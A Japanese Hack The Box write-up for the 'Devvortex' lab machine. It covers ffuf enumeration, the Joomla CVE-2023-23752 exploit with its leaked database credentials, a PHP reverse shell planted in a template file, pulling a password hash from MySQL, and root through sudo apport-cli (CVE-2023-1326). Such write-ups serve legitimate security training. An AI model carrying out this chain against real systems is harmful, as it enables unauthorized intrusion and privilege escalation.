---
title: "HTB_devvortex"
date: 2024-06-08T15:25:30+09:00
draft: false
---

## user

- nmap
  - ssh, http
- http
  - まず ffuf で subdomain を探す
    - ```ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fw 4 -t 100```
  - 次にディレクトリを探す
    - ```ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic```
  - ```/administrator``` が見つかる
  - Joomla! で動いている
- Joomla!
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
  - version を見つける
    - ```/administrator/manifests/files/joomla.xml```
  - CVE が刺さる
    - https://github.com/Acceis/exploit-CVE-2023-23752
    - ```ruby exploit.rb http://dev.devvortex.htb```

```shell
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

- revshell
  - Template -> Customise(Cassiopeia) を編集する
  - error.php に php revshell を入れる(index.php には書き込み権限が無い)
  - Template Preview でトリガーする
- logan
  - Joomla! の DB を検索すると mysql が使われていると分かる
  - mysql にログインする
    - ```mysql -u lewis -p```
    - ```show tables;```
    - ```select joomla;```
    - ```use joomla;```
    - ```show tables;```
    - ```select * FROM sd4fg_users;```
  - logan のハッシュパスワードが見つかる
    - ```$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12```
  - ```su logan```
  - uset.txt

## root

- ```sudo -l```
  - ```/usr/bin/apport-cli``` が使える
  - https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00
- apport-cli
  - ```sudo /usr/bin/apport-cli --file-bug```
  - 1 -> 2 -> V -> Enter -> ```!/bin/bash```
